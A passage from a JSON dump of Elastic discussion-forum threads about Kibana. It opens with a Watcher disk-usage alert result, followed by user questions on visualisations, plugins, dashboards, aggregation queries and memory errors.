\"bucketAgg\" : { \"doc_count_error_upper_bound\" : 0, \"sum_other_doc_count\" : 0, \"buckets\" : [ { \"doc_count\" : 8320, \"metricAgg\" : { \"value\" : 0.08243333175778389 }, \"key\" : \"IS-SC-052\" }, { \"doc_count\" : 5016, \"metricAgg\" : { \"value\" : 0.12124999985098839 }, \"key\" : \"IS-SC-025\" }, { \"doc_count\" : 8863, \"metricAgg\" : { \"value\" : 0.13904142784220833 }, \"key\" : \"IS-SC-027\" }, { \"doc_count\" : 8661, \"metricAgg\" : { \"value\" : 0.14300000667572021 }, \"key\" : \"IS-SC-030\" }, { \"doc_count\" : 5737, \"metricAgg\" : { \"value\" : 0.1590999960899353 }, \"key\" : \"IS-SC-005\" }, { \"doc_count\" : 9399, \"metricAgg\" : { \"value\" : 0.15913333122928938 }, \"key\" : \"IS-SC-033\" }, { \"doc_count\" : 10821, \"metricAgg\" : { \"value\" : 0.1721000038087368 }, \"key\" : \"IS-SC-007\" }, { \"doc_count\" : 2698, \"metricAgg\" : { \"value\" : 0.17494999803602695 }, \"key\" : \"IS-SC-021\" }, { \"doc_count\" : 2041, \"metricAgg\" : { \"value\" : 0.1915999948978424 }, \"key\" : \"IS-VSC-055\" }, { \"doc_count\" : 5095, \"metricAgg\" : { \"value\" : 0.2037999927997589 }, \"key\" : \"IS-VSC-054\" }, { \"doc_count\" : 4728, \"metricAgg\" : { \"value\" : 0.21940000355243683 }, \"key\" : \"IS-VSC-053\" }, { \"doc_count\" : 3258, \"metricAgg\" : { \"value\" : 0.22503500059247017 }, \"key\" : \"IS-SC-W013\" }, { \"doc_count\" : 5047, \"metricAgg\" : { \"value\" : 0.23309999704360962 }, \"key\" : \"IS-VSC-052\" }, { \"doc_count\" : 2237, \"metricAgg\" : { \"value\" : 0.23430000245571136 }, \"key\" : \"IS-VSC-056\" }, { \"doc_count\" : 10361, \"metricAgg\" : { \"value\" : 0.23972285794360296 }, \"key\" : \"IS-SC-W014\" }, { \"doc_count\" : 10594, \"metricAgg\" : { \"value\" : 0.2402785707797323 }, \"key\" : \"IS-SC-W012\" }, { \"doc_count\" : 5755, \"metricAgg\" : { \"value\" : 0.2653000056743622 }, \"key\" : \"IS-VSC-051\" }, { \"doc_count\" : 2017, \"metricAgg\" : { \"value\" : 0.2888999983668327 }, \"key\" : \"IS-VSC-W023\" }, { \"doc_count\" : 7299, \"metricAgg\" : { \"value\" : 0.29521905311516355 }, \"key\" : \"IS-SC-015\" }, { \"doc_count\" : 9896, \"metricAgg\" : { \"value\" : 0.29759999985496205 }, \"key\" : \"IS-SC-034\" }, { \"doc_count\" : 10341, \"metricAgg\" : { \"value\" : 0.31350428121430535 }, \"key\" : \"IS-SC-W011\" }, { \"doc_count\" : 1980, \"metricAgg\" : { \"value\" : 0.32471000850200654 }, \"key\" : \"IS-VSC-W022\" }, { \"doc_count\" : 11081, \"metricAgg\" : { \"value\" : 0.3354800004111374 }, \"key\" : \"IS-SC-016\" }, { \"doc_count\" : 5805, \"metricAgg\" : { \"value\" : 0.34869999686876935 }, \"key\" : \"IS-SC-032\" }, { \"doc_count\" : 4662, \"metricAgg\" : { \"value\" : 0.35280001163482666 }, \"key\" : \"IS-SC-018\" }, { \"doc_count\" : 6577, \"metricAgg\" : { \"value\" : 0.36875381374931226 }, \"key\" : \"IS-SC-037\" }, { \"doc_count\" : 6391, \"metricAgg\" : { \"value\" : 0.4001999869942665 }, \"key\" : \"IS-SC-022\" }, { \"doc_count\" : 6464, \"metricAgg\" : { \"value\" : 0.4035000006357829 }, \"key\" : \"IS-SC-026\" }, { \"doc_count\" : 4733, \"metricAgg\" : { \"value\" : 0.45899999141693115 }, \"key\" : \"IS-VSC-W054\" }, { \"doc_count\" : 6154, \"metricAgg\" : { \"value\" : 0.5841390521753402 }, \"key\" : \"IS_SC_035\" }, { \"doc_count\" : 5463, \"metricAgg\" : { \"value\" : 0.6119000017642975 }, \"key\" : \"IS-VSC-W052\" }, { \"doc_count\" : 5627, \"metricAgg\" : { \"value\" : 0.6254000067710876 }, \"key\" : \"IS-VSC-W051\" }, { \"doc_count\" : 5375, \"metricAgg\" : { \"value\" : 0.6842000037431717 }, \"key\" : \"IS-VSC-W053\" }, { \"doc_count\" : 6008, \"metricAgg\" : { \"value\" : 0.7868185843740191 }, \"key\" : \"IS-SC-003\" }, { \"doc_count\" : 2390, \"metricAgg\" : { \"value\" : 0.8041399856408437 }, \"key\" : \"IS-VSC-050\" } ] } } }, \"search\" : { \"request\" : { \"search_type\" : \"query_then_fetch\", \"indices\" : [ \"metricbeat-7.3*\" ], \"rest_total_hits_as_int\" : true, \"body\" : { \"size\" : 0, \"query\" : { \"bool\" : { \"filter\" : { \"range\" : { \"@timestamp\" : { \"gte\" : \"2020-04-16T02:24:03.77487Z||-10m\", \"lte\" : \"2020-04-16T02:24:03.77487Z\", \"format\" : \"strict_date_optional_time||epoch_millis\" } } } } }, \"aggs\" : { \"bucketAgg\" : { \"terms\" : { \"field\" : \"host.name.keyword\", \"size\" : \"40\", \"order\" : { \"metricAgg\" : \"asc\" } }, \"aggs\" : { \"metricAgg\" : { \"avg\" : { \"field\" : \"system.filesystem.used.pct\" } } } } } } } } }, \"condition\" : { \"type\" : \"script\", \"status\" : \"success\", \"met\" : true }, \"transform\" : { \"type\" : \"script\", \"status\" : \"success\", \"payload\" : { \"results\" : [ { \"value\" : 0.8041399856408437, \"key\" : \"IS-VSC-050\" } ] } }, \"actions\" : [ { \"id\" : \"logging_1\", \"type\" : \"logging\", \"status\" : \"success\", \"logging\" : { \"logged_text\" : \"Disk Usage Warning !! is used disk over 80%. \" } } ] }, \"messages\" : [ ] } }",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "dd2e63c0-e6bc-4750-985e-ae3699e32493",
    "url": "https://discuss.elastic.co/t/visualize-data-from-multiple-indexes-in-one-chart/226262",
    "title": "Visualize data from multiple indexes in one chart",
    "category": [
      "Kibana"
    ],
    "author": "Mehak_Bhargava",
    "date": "April 2, 2020, 5:54pm April 2, 2020, 6:08pm April 2, 2020, 6:30pm April 2, 2020, 7:42pm April 2, 2020, 9:10pm April 2, 2020, 9:21pm April 2, 2020, 9:32pm April 3, 2020, 3:28am April 3, 2020, 6:45pm April 6, 2020, 6:42pm April 7, 2020, 6:10pm April 21, 2020, 12:31am April 21, 2020, 12:31am",
    "body": "Hi, I have 5-7 indexes with different names and want to create one chart which will get a field that is existing in all indexes. For example index 1, index 2, index3, have a field called \"type\" and I want to get the count of \"type\" in all indexes in Kibana's visualize app. I do not want to combine all indexes into one index, as I want to see the sepearte index names.",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "68e3de6f-a0c2-4c63-bb10-db6311c02710",
    "url": "https://discuss.elastic.co/t/how-to-customize-kibana-ui-and-add-content-using-html/228059",
    "title": "How to customize Kibana UI and add content using HTML",
    "category": [
      "Kibana"
    ],
    "author": "Potter_Ginny",
    "date": "April 15, 2020, 8:31am April 15, 2020, 10:40am April 16, 2020, 4:21am April 20, 2020, 8:34pm",
    "body": "Hello, I would like to add a floating footer at every page of Kibana. This will be our own custom footer and it will contain some text and hyperlinks leading to important sites in our organization. Where could be the main HTML file for the home page? Btw, I'm using kibana-7.1.1-windows-x86_64 version. image1705×934 90.3 KB Need help. Thanks a lot!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3bd6a739-fac9-4ca7-8977-a2f330c00063",
    "url": "https://discuss.elastic.co/t/how-to-get-the-absolute-time-of-dashboard-time-filter-picked/228278",
    "title": "How to get the absolute time of Dashboard time filter picked?",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 16, 2020, 8:34am April 20, 2020, 3:39pm April 20, 2020, 4:38pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8d606fc4-e587-4c43-bfa1-af84f1a52ed8",
    "url": "https://discuss.elastic.co/t/terms-may-be-incomplete-because-the-request-is-taking-too-long/228899",
    "title": "Terms may be incomplete because the request is taking too long",
    "category": [
      "Kibana"
    ],
    "author": "jpigott",
    "date": "April 20, 2020, 3:52pm April 20, 2020, 4:53pm",
    "body": "I am hosted in the Elastic Cloud and a new subscriber. I am using the experimental controls filter option (which is awesome) but receiving this error when the pages are loading.\"Terms may be incomplete because the request is taking too long. Adjust the autocomplete settings in the kibana.yml for complete results.\" I have increased the value to be kibana.autocompleteTimeout: 10000 and it doesn't seem like the filter is waiting that long to load the combo box of values for the filter. Is there another setting that needs to be changed? Or do I need to do a full restart of the nodes, after hitting save it seems like it is restarting the kibana nodes itself? Thanks! Jeff",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f43a831e-3cc6-42ea-82f6-3ea5f8bb78de",
    "url": "https://discuss.elastic.co/t/kibana-is-there-a-way-to-create-session-duration/228745",
    "title": "Kibana, Is there a way to create session duration",
    "category": [
      "Kibana"
    ],
    "author": "levi_munthe",
    "date": "April 19, 2020, 5:02pm April 19, 2020, 7:33pm April 20, 2020, 3:12pm April 20, 2020, 3:40pm",
    "body": "Hai guys, i am new in ELK and have an issue to create a session duration between 2 field. Here is the data below. image1106×325 12.9 KB the yellow mark is the data that i want to calculate the time. my logic is to grouping the data with session and calculate the time by (recent time - oldest time) or (top 1 CreateAt_descending - top 1 CreateAt_ascending) to calculate the session duration. is there any way to get this result. Thanks.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "439f51e4-f352-4065-90b4-7890d0ce5ae6",
    "url": "https://discuss.elastic.co/t/display-plan-and-count/228345",
    "title": "Display plan and count",
    "category": [
      "Kibana"
    ],
    "author": "jeanmanu",
    "date": "April 16, 2020, 2:48pm April 20, 2020, 3:36pm",
    "body": "Hello, Sorry if this question already exists! I would just like to get a \"count\" from a \"visualize\" in an HTML page. Need: \"We would like to display the plan of our establishment and display the number of repairs for each zone\" I tried to look on the side of \"Vega\" ... without success. Do you have a suggestion? Thank you in advance",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "dd8b3ed0-a707-4272-9090-128b4ac3063c",
    "url": "https://discuss.elastic.co/t/math-operators-in-kibana/228401",
    "title": "Math operators in kibana",
    "category": [
      "Kibana"
    ],
    "author": "Yaniv_Nuriel",
    "date": "April 16, 2020, 8:34pm April 22, 2020, 12:32pm",
    "body": "Dear all, Is there anyway to perform mathematical operator in kibana? I have 2 integer fields in the document, can I visualize a new column that is a result of their duplication? e.g. AxB Thanks Yaniv",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8e87e51f-a05e-4ad0-a8ca-191150d202d7",
    "url": "https://discuss.elastic.co/t/find-the-delta-difference-between-bucket-aggregations/228424",
    "title": "Find the Delta difference between bucket aggregations",
    "category": [
      "Kibana"
    ],
    "author": "anv-ani",
    "date": "April 17, 2020, 12:30am April 20, 2020, 3:26pm",
    "body": "I have 2 buckets aggregration for different time interval. i get metrics from different data sources and i get the unique count of metrics i get from different data source. Example my individual bucket aggregation looks like this Bucket 1 (Timestamp: yesterday) {data source1} {unique count 1} {data source 2} {unique count 2} {data source n} {unique count n} Bucket 2 (Timestamp: today) {data source1} {unique count 1} {data source 2} {unique count 2} {data source n} {unique count n} I want to find the delta of unique counts between each data-source across the 2 buckets and plot the delta against the data source. How could i achieve it. ?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e43c0295-b765-456e-9fb6-2a00c03569f1",
    "url": "https://discuss.elastic.co/t/cannot-create-index-pattern-starting-with-a-wild-character/228425",
    "title": "Cannot create index pattern starting with a wild character",
    "category": [
      "Kibana"
    ],
    "author": "Rahul_Kumar4",
    "date": "April 17, 2020, 12:57am April 20, 2020, 3:22pm",
    "body": "Hi, is it not possible to to create index pattern that start with a wild card character?. Example * distribution * The Kibana console shows that are matching indices but it does not let me save the pattern.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a7081754-b89f-4cb7-920f-c61f0832cfc9",
    "url": "https://discuss.elastic.co/t/kibana-plugin-for-kibana-7-1-1-installs-but-fails-to-find-index-light-css/228207",
    "title": "Kibana plugin for kibana 7.1.1 installs but fails to find index.light.css",
    "category": [
      "Kibana"
    ],
    "author": "Jessica_Langanz",
    "date": "April 15, 2020, 9:14pm April 20, 2020, 3:17pm",
    "body": "Hi, i created a kibana plugin and it works fine in my kibana development environment. I am able to build and install the plugin in my kibana server, but once it loads I get the following errors: image1077×350 31.5 KB If i create manually the index.light.css file under \\kibana-7.1.1-windows-x86_64\\built_assets\\css\\plugins\\my_plugin_name the error disapears, so I imagine that the problem is that the build script is not creating my css files, can anyone help me with that? I am using kibana 7.1.2 and building for 7.1.1",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "22287ee2-08d9-45b4-b278-e6b90fd61595",
    "url": "https://discuss.elastic.co/t/embed-a-react-component-into-kibana-visualizations/228228",
    "title": "Embed a React Component into Kibana Visualizations",
    "category": [
      "Kibana"
    ],
    "author": "Paul_Gege",
    "date": "April 16, 2020, 1:06am April 20, 2020, 3:11pm",
    "body": "Hi, I'd like add a React Component (essentially a custom tooltip) into my Kibana Visualizations. I want to be able to show my component whenever some part of a visualization is hovered over. Can someone please point me to the right part of the Kibana source code to achieve this?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "54cdf639-8dd7-47dd-98e9-a93cb50625b6",
    "url": "https://discuss.elastic.co/t/unable-to-get-date-range-control-to-filter-dates-in-kibana-dashboard/228791",
    "title": "Unable to get Date Range Control to filter dates in Kibana Dashboard",
    "category": [
      "Kibana"
    ],
    "author": "ChintanCParekh",
    "date": "April 20, 2020, 5:45am April 20, 2020, 3:09pm",
    "body": "Hi Team, I am working on visualization and dashboard in kibana. We have field called created_date with format datetime in an index pattern and so as in document. Hence we are trying to filter in visualization and dashboard using date range when it is embedded in application. We are unable to find any ready to use date range control filter in kibana. We need a 'datetime picker control' for kibana dashboard or any other alternative which can be used to filter all the data in dashboard using date range. Note :*** While designing date range filter option is available but while embedding control is required so that end user can work through date range and filter data accordingly. Any help would be much appreciated.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c8def7f3-44ca-47cc-8612-da1c2e630023",
    "url": "https://discuss.elastic.co/t/implementing-fullscreen-in-a-kibana-plugin/228849",
    "title": "Implementing Fullscreen in a Kibana plugin",
    "category": [
      "Kibana"
    ],
    "author": "Nicolap",
    "date": "April 20, 2020, 11:04am April 20, 2020, 11:53am April 20, 2020, 12:38pm April 20, 2020, 12:42pm April 20, 2020, 12:56pm April 20, 2020, 1:09pm April 20, 2020, 1:13pm April 20, 2020, 1:15pm April 20, 2020, 1:30pm April 20, 2020, 2:02pm April 20, 2020, 2:11pm",
    "body": "Hi there, I need to implement a full screen feature inside a kibana plugin, like to the dashboard full screen (without header and sidebar) I tryed to use the code describe in the \" Fullscreen demo\" from eui library, without success. Can someone help me? Thanks, Nicola",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "6987584d-0ac2-4766-87bc-2754d338659f",
    "url": "https://discuss.elastic.co/t/elastic-maps/228857",
    "title": "Elastic maps",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 20, 2020, 12:00pm April 20, 2020, 12:45pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "452a7805-327e-4da2-a0e0-f0a83e475348",
    "url": "https://discuss.elastic.co/t/using-a-painless-script-inside-kibana/228839",
    "title": "Using a painless script inside Kibana",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 20, 2020, 10:35am April 20, 2020, 12:31pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f8a2c977-677f-4461-8b70-f55bf9d7e507",
    "url": "https://discuss.elastic.co/t/show-dashboard-like-demo/228793",
    "title": "Show dashboard like demo",
    "category": [
      "Kibana"
    ],
    "author": "sowter",
    "date": "April 20, 2020, 6:16am April 20, 2020, 11:57am",
    "body": "by your demo https://demo.elastic.co/app/kibana#/dashboard/welcome_dashboard?ultron=cn-kibana-getting-started-webinar&blade=touch&hulk=email&mkt_tok=eyJpIjoiWlRobU56RTJaVGRtTVdabCIsInQiOiI1THNlKzhCZXFRVjRxSFhjbzZpNCtjT2lqNStTMDdYY1ltSHNvXC9aWUJOSjRBXC9wMEt2WDNpRE9sZUsySW10Zk5ZdjJPWTFcL2dLTVUxT3JPWVdMZHZxZjRNQVM1MTlFaldJQkJDXC9VMWY5eWNFTjBTd0FpVk5abkRuazdcLzJNXC9DYSJ9&_g=()&_a=(description:'Main%20landing%20page%20for%20Elastic%20Demo%20Gallery;%20a%20good%20reset%20point%20if%20you%20get%20lost.',filters:!(),fullScreenMode:!f,options:(darkTheme:!f,hidePanelTitles:!f,useMargins:!t),panels:!((embeddableConfig:(title:''),gridData:(h:17,i:'2',w:15,x:33,y:7),id:'51cbcc10-9211-11e8-8fa2-3d5f811fbd0f',panelIndex:'2',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:17,i:'3',w:15,x:0,y:17),id:welcome-beats-modules-visualization,panelIndex:'3',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:12,i:'4',w:12,x:36,y:46),id:'68131db0-9212-11e8-8fa2-3d5f811fbd0f',panelIndex:'4',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:12,i:'6',w:12,x:24,y:46),id:'69e69340-9214-11e8-8fa2-3d5f811fbd0f',panelIndex:'6',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:10,i:'8',w:15,x:0,y:7),id:'55c90dc0-9287-11e8-8fa2-3d5f811fbd0f',panelIndex:'8',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:10,i:'9',w:15,x:33,y:24),id:'10553fb0-9288-11e8-8fa2-3d5f811fbd0f',panelIndex:'9',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:12,i:'10',w:12,x:0,y:46),id:'482b9ef0-9299-11e8-8fa2-3d5f811fbd0f',panelIndex:'10',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:12,i:'11',w:12,x:12,y:46),id:'196d0660-153b-11e9-9985-f1ba5bcab6e5',panelIndex:'11',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:12,i:'12',w:12,x:36,y:34),id:'700317b0-153d-11e9-9985-f1ba5bcab6e5',panelIndex:'12',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:12,i:'13',w:12,x:24,y:34),id:'10624140-65ed-11e9-97a8-4d57d901c672',panelIndex:'13',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:12,i:'14',w:12,x:12,y:34),id:a9871430-6611-11e9-97a8-4d57d901c672,panelIndex:'14',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:7,i:'15',w:48,x:0,y:0),id:'95caa470-6616-11e9-97a8-4d57d901c672',panelIndex:'15',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:12,i:'16',w:12,x:0,y:34),id:e7037a10-a739-11e9-aced-376b520cfdd0,panelIndex:'16',type:visualization,version:'7.5.1'),(embeddableConfig:(title:''),gridData:(h:27,i:'0d6d87ab-46b5-4798-9c47-dce9864f76f4',w:18,x:15,y:7),id:fd1964b0-1dd9-11ea-ae13-f17bde635134,panelIndex:'0d6d87ab-46b5-4798-9c47-dce9864f76f4',type:visualization,version:'7.5.1')),query:(language:kuery,query:''),timeRestore:!f,title:'Welcome%20Dashboard',viewMode:view) I know share dashboard but i want to do like dashboard 1.be guest user already (No need to enter account and password) 2.read only mode",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c411f914-7afe-4fca-b051-fba6978b0211",
    "url": "https://discuss.elastic.co/t/render-visualize-in-a-kibana-plugin/228204",
    "title": "Render visualize in a Kibana plugin",
    "category": [
      "Kibana"
    ],
    "author": "Nicolap",
    "date": "April 15, 2020, 8:55pm April 16, 2020, 3:28pm April 16, 2020, 3:50pm April 20, 2020, 7:40am April 20, 2020, 8:48am April 20, 2020, 10:58am April 20, 2020, 11:40am",
    "body": "Hello guys, I'm writing a kibana plugin, and as requirements I should render some visualizations. Using the code below I can see the visualize rendered correctly. import { start as embeddables } from \"plugins/embeddable_api/np_ready/public/legacy\"; ... ... const visParams = { timeRange: { from: \"now-1M\", to: \"now\", mode: \"quick\" }, filters: [], query: {}, }; let factory; if (!factory) { factory = embeddables.getEmbeddableFactory(\"visualization\"); } const visHandler = await factory.createFromSavedObject( visId, visParams ); visHandler.render(this.node) The main problem is after the render method. After it, I can notice a refresh of the webpage that makes me changes the browser url (to the base url of plugin), whitout changing the current view. Does anyone know what the problem might be? Regards, Nicola",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d84240d4-d640-450d-a355-24b00b83a6d0",
    "url": "https://discuss.elastic.co/t/using-canvas-to-conditionally-format-an-element-powered-by-a-query-based-on-a-previous-timeframe-of-the-same-query/226666",
    "title": "Using Canvas to conditionally format an element powered by a query based on a previous timeframe of the same query",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 6, 2020, 9:56am April 6, 2020, 8:12pm April 7, 2020, 8:32am April 20, 2020, 11:18am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "8ff3a5e3-7c57-43f1-bc99-3edd07ed08c2",
    "url": "https://discuss.elastic.co/t/kibana-discovery-error/228773",
    "title": "Kibana discovery error",
    "category": [
      "Kibana"
    ],
    "author": "Roshan_Jha",
    "date": "April 20, 2020, 3:52am April 20, 2020, 7:51am April 20, 2020, 8:55am April 20, 2020, 10:49am",
    "body": "I am executing aggregation query in kibana discovery but it giving me error [parsing_exception] no [query] registered for [aggs], which is working fine in dev tools. Here is the query which i am using. { \"aggs\": { \"users\": { \"terms\": { \"field\": \"principal.keyword\" }, \"aggs\": { \"last_visted_date\": { \"max\": { \"field\": \"timestamp\" } }, \"activity_login\": { \"filter\": { \"term\": { \"action.keyword\": \"LOGIN\" } }, \"aggs\": { \"last_login_date\": { \"max\": { \"field\": \"timestamp\" } } } }, \"active_users\": { \"bucket_selector\": { \"buckets_path\": { \"lastvisted\": \"last_visted_date\", \"lastlogindate\": \"activity_login>last_login_date\" }, \"script\": \"if(params.lastvisted==params.lastlogindate){return true;}else{return false;}\" } } } } } } Here is the error i am getting [parsing_exception] no [query] registered for [aggs]",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "33c40094-7b3a-4b69-a27c-3f5b0bde3307",
    "url": "https://discuss.elastic.co/t/kibana-field-event-id-not-available-in-bucket-from-winlogbeat/228828",
    "title": "Kibana : field event_id not available in bucket (from winlogbeat)",
    "category": [
      "Kibana"
    ],
    "author": "icirco",
    "date": "April 20, 2020, 9:38am April 20, 2020, 10:31am",
    "body": "hello, I try to create a graph but field is not available in the field section... I use winlogbeat (7.4) and I would like to count some specific event_id",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "81be171e-ea61-4ab0-b8d6-e6e825a9a6b4",
    "url": "https://discuss.elastic.co/t/lapsed-time-column-in-a-table-which-needs-to-be-a-running-time/226066",
    "title": "Lapsed time column in a table which needs to be a running time",
    "category": [
      "Kibana"
    ],
    "author": "RichardBaerveldt",
    "date": "April 1, 2020, 2:39pm April 17, 2020, 1:26pm April 20, 2020, 9:15am",
    "body": "Hi Guys, I am busy with a project to create real time dashboards for our workflow. Our POC was successful and I'm busy clarifying the final requirements. One thing which I am stumped with is an elapsed time value which I would rather have inside Kibana/elastic search instead of creating over head in SQL. I want to show a real time running time in a HH24:MI:SS format in a column of a table showing the oldest piece of work and how long it has been there until the next update moves it to the next queue/pool. Any suggestions? In my logstash I have a TransitionTime which is a timestamp Thanks in advance",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "bec2b24d-4a24-4c01-b98e-bd234dc173d3",
    "url": "https://discuss.elastic.co/t/kibana-javascript-heap-out-of-memory/228365",
    "title": "Kibana JavaScript heap out of memory",
    "category": [
      "Kibana"
    ],
    "author": "chandu5565",
    "date": "April 16, 2020, 4:09pm April 17, 2020, 3:06pm April 20, 2020, 7:48am April 20, 2020, 8:13am April 20, 2020, 8:17am April 20, 2020, 8:25am",
    "body": "Hi, While generating report in kibana am getting below error. How can i increase the heap memory for kibana. log [13:01:39.659] [info][queue-job][reporting] Successfully queued job: k92rw1ad0xuh4e318d6raay8 log [13:04:46.929] [info][esqueue][queue-worker][reporting] k92ruhg00xuh4e318d0kxz12 - Job execution completed successfully <--- Last few GCs ---> [43865:0x3e3f0c0] 289973 ms: Mark-sweep 1248.7 (1373.6) -> 1248.5 (1357.6) MB, 138.9 / 0.0 ms (average mu = 0.816, current mu = 0.001) last resort GC in old space requested [43865:0x3e3f0c0] 290105 ms: Mark-sweep 1248.5 (1357.6) -> 1248.5 (1342.1) MB, 132.7 / 0.0 ms (average mu = 0.686, current mu = 0.000) last resort GC in old space requested <--- JS stacktrace ---> ==== JS stack trace ========================================= 0: ExitFrame [pc: 0x5512055be1d] Security context: 0x2e789e19e6e1 <JSObject> 1: substring [0x2e789e18e391](this=0x2e7b6e1ed161 <Very long string[287556309]>,0,1000) 2: /* anonymous */ [0x15ab2b721081] [/usr/share/kibana/x-pack/legacy/plugins/reporting/server/lib/esqueue/worker.js:64] [bytecode=0x36c7b6bf84a1 offset=149](this=0x15ab2b71f479 <EventEmitter map = 0xf7f449c509>,msg=0x056b22ed1449 <String[50]: Failure saving job out... FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory 1: 0x8dc1c0 node::Abort() [/usr/share/kibana/bin/../node/bin/node] 2: 0x8dc20c [/usr/share/kibana/bin/../node/bin/node] 3: 0xad60ae v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [/usr/share/kibana/bin/../node/bin/node] 4: 0xad62e4 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [/usr/share/kibana/bin/../node/bin/node] 5: 0xec3972 [/usr/share/kibana/bin/../node/bin/node] 6: 0xed318f v8::internal::Heap::AllocateRawWithRetryOrFail(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) [/usr/share/kibana/bin/../node/bin/node] 7: 0xe9b3d5 [/usr/share/kibana/bin/../node/bin/node] 8: 0xea2c4a v8::internal::Factory::NewRawOneByteString(int, v8::internal::PretenureFlag) [/usr/share/kibana/bin/../node/bin/node] 9: 0xfec6ed v8::internal::String::SlowFlatten(v8::internal::Handle<v8::internal::ConsString>, v8::internal::PretenureFlag) [/usr/share/kibana/bin/../node/bin/node] 10: 0xad36d4 v8::internal::String::Flatten(v8::internal::Handle<v8::internal::String>, v8::internal::PretenureFlag) [/usr/share/kibana/bin/../node/bin/node] 11: 0xea422d v8::internal::Factory::NewProperSubString(v8::internal::Handle<v8::internal::String>, int, int) [/usr/share/kibana/bin/../node/bin/node] 12: 0x119032d v8::internal::Runtime_StringSubstring(int, v8::internal::Object**, v8::internal::Isolate*) [/usr/share/kibana/bin/../node/bin/node] 13: 0x5512055be1d Aborted (core dumped) ---> help is really appreciated.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "1817da5f-31f3-465a-ac57-3300bced00de",
    "url": "https://discuss.elastic.co/t/kibana-html-page-additional-elements-customization-of-home-page/228470",
    "title": "Kibana HTML page additional elements - customization of home page",
    "category": [
      "Kibana"
    ],
    "author": "Potter_Ginny",
    "date": "April 17, 2020, 8:07am April 17, 2020, 3:16pm April 17, 2020, 4:13pm April 20, 2020, 8:22am",
    "body": "Hello people, Does anyone know what exact directory or folder path is Kibana home page's HTML file located?? Is it also possible for me to insert some code there if I want to add more elements like modal/ footer/header or even just text? Version 7.1.1 is what I'm using. image1163×686 61.5 KB Pls. help out. Thanks all!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b434b79f-264a-412e-b13f-346a8220bb1d",
    "url": "https://discuss.elastic.co/t/kibana-lens-y-axis-percentage-mode/228711",
    "title": "Kibana lens y axis percentage mode",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 19, 2020, 8:28am April 20, 2020, 7:59am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f295ee77-cb3f-49b5-bdf4-2a632acacb6a",
    "url": "https://discuss.elastic.co/t/group-values-of-specific-field-into-some-categories/227108",
    "title": "Group values of specific field into some categories",
    "category": [
      "Kibana"
    ],
    "author": "sai_16",
    "date": "April 8, 2020, 11:13am April 9, 2020, 7:21am April 9, 2020, 7:26am April 9, 2020, 7:27am April 9, 2020, 9:16am April 9, 2020, 9:33am April 9, 2020, 9:51am April 9, 2020, 12:39pm April 9, 2020, 1:56pm April 9, 2020, 1:58pm April 13, 2020, 3:16pm April 13, 2020, 8:19pm April 15, 2020, 8:06am April 15, 2020, 8:11am April 15, 2020, 10:42am April 15, 2020, 11:36am April 15, 2020, 12:47pm April 15, 2020, 12:50pm April 15, 2020, 12:56pm April 20, 2020, 7:48am",
    "body": "I'm using area chart for visualization of process names to the total cpu pct,but i want name some of the process to one group and some other process to another group ,is there a way to do it? like :java,app -process names should be in the name of 'Application' :metricbeat process should be as 'System'. As of now it displays process names,instead can i display them by grouping ?",
    "website_area": "discuss",
    "replies": 20
  },
  {
    "id": "774ed353-55f1-4bab-b4c6-48a6378947ed",
    "url": "https://discuss.elastic.co/t/how-to-interpret-this-graph/228696",
    "title": "How to interpret this graph",
    "category": [
      "Kibana"
    ],
    "author": "nages",
    "date": "April 19, 2020, 4:14am April 19, 2020, 11:19pm April 20, 2020, 2:55am April 20, 2020, 6:44am April 20, 2020, 7:43am",
